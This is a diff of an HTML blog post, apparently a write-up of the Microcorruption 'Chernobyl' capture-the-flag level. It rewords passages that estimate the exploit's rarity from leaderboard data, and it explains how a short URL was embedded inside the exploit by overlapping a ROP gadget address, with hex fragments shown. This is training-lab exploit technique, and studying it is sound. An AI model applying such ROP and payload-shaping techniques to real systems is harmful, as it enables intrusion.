@@ -4709,11 +4696,10 @@ The CPU completed in 225202 cycles.
 
 <p>The first "challenge" in the series, with 51,203 solves, is a guided tutorial. The second one, with 29,872 solves, involves extracting a hard-coded plaintext password by analyzing defined strings in the firmware. Given that the latter is the first one that requires even a modicum of technical skill, it is fair to say that it is the first "real" challenge in the series.</p>
 
-<p>Properly speaking, there were 29,872 contenders. These challenges were hosted as a CTF and remained online for eight years afterward. The early contestants were highly motivated to finish the entire set quickly, but a certain amount of "motivational drift" probably occurred over the years, resulting in relatively more people quitting partway through. This trend skewed the numbers over time and is a bias for which to account.</p>
+<p>These challenges were hosted as a CTF and remained online for eight years afterward. The early contestants were highly motivated to finish the entire set quickly, but a certain amount of "motivational drift" probably occurred over the years, resulting in relatively more people quitting partway through. This trend skewed the numbers over time and is a bias for which to account.</p>
 
 <h4>Conservative Numbers</h4>
-
-<p>In May 2022, the top 2.6% of the 29,872 competitors had completed Chernobyl. The following is the earliest leaderboard data available, preserved as a snapshot on the Wayback Machine in <a href="https://web.archive.org/web/20160414044337/https://microcorruption.com/hall_of_fame/progress">April 2016</a>.</p>
+<p>Properly speaking, there were 29,872 contenders. In May 2022, the top 2.6% of them had completed Chernobyl. The following is the earliest leaderboard data available, preserved as a snapshot on the Wayback Machine in <a href="https://web.archive.org/web/20160414044337/https://microcorruption.com/hall_of_fame/progress">April 2016</a>.</p>
 
     <br>
       <figure>
@@ -4721,7 +4707,7 @@ The CPU completed in 225202 cycles.
           loading="lazy" alt="Overall level progress for Microcorruption, circa April, 2016." />
       </figure>
 
-      <p>At that point, writing a working exploit for Chernobyl put someone in the top 3.95% among the earlier, ostensibly more driven population. If 788 people did so as of May 2022, and those people are assumed to constitute 3.95% of the significant competition, that implies there are 19,922 serious competitors. If two 59-byte Chernobyl exploits exist, each progenitor is 1 in 9,961.</p>
+      <p>At that point, writing a working exploit for Chernobyl put someone in the top 3.95% of the earlier, ostensibly more driven population. Projecting forward: if 788 people wrote Chernobyl exploits as of May 2022, and those people are assumed to constitute 3.95% of the significant competition, that implies there are 19,922 serious competitors. If two 59-byte Chernobyl exploits exist, each progenitor is 1 in 9,961.</p>
 
 <h2>Outside Corroboration</h2>
 
@@ -4729,7 +4715,7 @@ The CPU completed in 225202 cycles.
 
 <input type="checkbox" id="sn-1" class="sidenote-toggle" />
 <span class="sidenote">
-	If anyone from NCC Group reads this, yours truly would appreciate a public archive of the historical challenge leaderboard data. 
+	If anyone from NCC Group is reading this, yours truly would appreciate a public archive of the historical challenge leaderboard data. 
 </span>
 
 
@@ -5023,7 +5009,7 @@ b&apos;<mark>4576657279</mark>&apos;
 
 <h3>This Exploit Links Its Own Writeup</h3>
 
-<p>Recall that the firmware only parses the first character of each command, allowing exploits to substitute nulls in place of the middle bytes. Given a sufficiently short URL, it is possible to embed a link to this writeup in the middle of the exploit without breaking it.</p> 
+<p>The firmware only parses the first character of each command, allowing the substitution of nulls in place of the middle bytes. Given a sufficiently short URL, it is possible to embed a link to this writeup in the middle of the exploit without breaking it.</p>
 
 <pre><code>&gt;&gt;&gt; binascii.hexlify(b&quot;is.gd/muzap&quot;)
 b&apos;<mark>69732e67642f6d757a6170</mark>&apos;
@@ -5043,7 +5029,7 @@ b&apos;<mark>69732e67642f6d757a6170</mark>&apos;
 6e00<mark>70</mark>4d7f
 </code></pre>
 
-<p>The last character in the short link URL is the same as the least significant byte of the ROP gadget address—coincidentally, a printable alphanumeric. This hack allows the URL to overlap the gadget.</p>
+<p>The last character in the short link URL is the same as the least significant byte of the payload ROP gadget address—coincidentally, a printable alphanumeric. This hack allows the URL to overlap the gadget.</p>
 
 <h3>A Different Kind Of Record</h3>
 
